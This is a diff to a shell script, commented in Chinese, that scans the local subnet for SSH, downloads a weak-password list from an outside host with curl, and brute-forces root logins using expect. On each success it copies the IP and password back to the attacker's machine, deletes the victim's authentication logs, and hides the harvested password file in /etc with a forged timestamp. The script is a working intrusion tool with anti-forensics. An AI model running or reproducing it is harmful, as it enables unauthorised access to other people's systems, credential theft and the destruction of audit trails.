@@ -19,14 +19,15 @@ echo $local_pass
 for i in {2..254}
 do
    ip=${local_ip%.*}.$i    
-   
+       
    echo "telnet $ip"
-   
+       
    telnet $ip 22 >> telnet_result.txt
 
 done
 
 # 将telnet_result.txt文件中的telnet成功的例子存入telnet_alive.txt
+echo 1
 cat telnet_result.txt | grep -B 1 \] | grep [0-9] | awk '{print $3}' | cut -d '.' -f 1,2,3,4 >> telnet_alive.txt
 
 #rm telnet_result.txt
@@ -39,43 +40,51 @@ done < ./telnet_alive.txt
 
 # 使用openssh服务，爆破连接服务器
 
+# 下载生成的弱口令字典
+echo 开始下载弱口令字典
+curl https://www.macrz.com/password.txt >> password.txt
+
+mkdir /home/ip
+
 while read ip
 do
 
     while read password
     do
-    
+        
     expect <<EOF  
-            set timeout 3 
-            spawn ssh root@$ip
-            expect { 
-                "yes/no" { send "yes\n" ; exp_continue } 
-                "assword" { send "$password\n" }
-            } 
-            expect "Permission*" {send "\n"}
-            expect "#" { 
-            send "sudo mkdir /home/demo\n" ;
-            send "sudo touch /home/demo/$ip+$password\n" ; 
-            send "sudo scp /home/demo/$ip+$password root@$local_ip:/home/ip\n" ;
-            expect { 
-                "yes/no" { send "yes\n" ; exp_continue }
-                "assword" { send "$local_pass\n" ; exp_continue }
-                   }
-            send "sudo rm -rf /home/demo\n" ;
-            send "cat /proc/version\n" ;
-            expect "Ubuntu/Debian" { send "sudo rm /var/log/auth.log\n" ; }
-            expect "Red Hat" { send "sudo rm /var/log/secure\n" ; }
-            }
-            expect "#" { send "exit\n" }
-    
+                
+        set timeout 3 
+        spawn ssh root@$ip
+        expect { 
+            "yes/no" { send "yes\n" ; exp_continue } 
+            "assword" { send "$password\n" }
+        } 
+        expect "Permission*" {send "\n"}
+        expect "#" { 
+        send "sudo mkdir /home/demo\n" ;
+        send "sudo touch /home/demo/$ip+$password\n" ; 
+        send "sudo scp /home/demo/$ip+$password root@$local_ip:/home/ip\n" ;   
+        expect { 
+            "yes/no" { send "yes\n" ; exp_continue }
+            "assword" { send "$local_pass\n" ; exp_continue }
+                }
+        send "sudo rm -rf /home/demo\n" ;
+        send "cat /proc/version\n" ;
+        expect "Ubuntu/Debian" { send "sudo rm /var/log/auth.log\n" ; }
+        expect "Red Hat" { send "sudo rm /var/log/secure\n" ; }
+        }
+        expect "#" { send "exit\n" }
+        
     expect eof
 EOF
+
 # 检测文件传输过来后，退出while循环
 
     if [ -f "/home/ip/$ip+$password" ] ; then
     break;
     fi
-    
+        
     done < ./password.txt
 
 done < ./telnet_alive.txt
@@ -85,36 +94,14 @@ path=/home/ip
 files=$(ls $path)
 for filename in $files
 do
-   echo $filename >> pass_nontools.txt
+    echo $filename >> pass_nontools.txt
 done
 
 # 清除痕迹
 echo 开始清理痕迹
-sudo rm telnet_result.txt telnet_alive.txt
+sudo rm telnet_result.txt telnet_alive.txt password.txt
+sudo rm -rf /home/ip
 echo 生成文件已删除
-sudo rm 
-echo 源文件已恢复
 sudo touch -r /etc/hosts pass_nontools.txt
 sudo mv pass_nontools.txt /etc
 echo 保存密码文件时间已修改，已转移文件夹
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
